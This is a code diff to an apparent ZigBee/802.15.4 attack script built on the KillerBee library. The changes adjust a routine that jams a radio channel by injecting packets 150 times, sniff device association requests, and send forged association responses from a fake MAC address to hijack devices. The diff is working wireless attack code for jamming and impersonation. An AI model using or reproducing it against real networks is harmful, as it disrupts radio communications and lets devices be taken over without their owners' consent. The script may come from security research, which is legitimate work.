@@ -10,7 +10,7 @@ from killerbee import *
 BEACON_RESPONSE_LISTEN_TRIES = 10
 
 # Number of channels to increment after jamming
-CHANNEL_INCREMENT = 2
+CHANNEL_INCREMENT = 1
 
 # Beacon request packet (captured via Wireshark)
 BEACON_REQUEST_PKT_BYTES = str(bytearray([
@@ -99,7 +99,7 @@ if __name__ == '__main__':
         # Jam for 0.4 sec
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
         #kb.jammer_on()
-        kb.inject(JAM_PKT_BYTES, new_channel, count=150, delay=0)
+        kb.inject(JAM_PKT_BYTES, args.channel, count=150, delay=0)
         #time.sleep(JAM_TIME_SEC)
         #kb.jammer_off()
 
@@ -139,7 +139,7 @@ if __name__ == '__main__':
                 packet_bytes = bytearray(packet['bytes'])
                 # Beacon requests have 0b011 at the end of their first byte
                 # and 0x01 as their 17th byte
-                if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[7] == 0x07):
+                if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[17] == 0x01):
                     print('  Got association request.')
                     assoc_request_pkt_bytes = bytearray(packet['bytes'])
                     got_assoc_request = True
@@ -155,7 +155,7 @@ if __name__ == '__main__':
         # 3. Destination MAC address (extracted from assoc request)
         # 4. Our mac address
         # 5. Assoc response code, new device addr = 0x1234, assoc success
-        assoc_response_pkt_bytes = bytearray([0x23, 0xc8, assoc_response_seq_num]) + \
+        assoc_response_pkt_bytes = bytearray([0x63, 0xcc, assoc_response_seq_num]) + \
                 assoc_response_dest_pan + \
                 assoc_response_dest_mac + \
                 fake_mac_addr_bytes + \
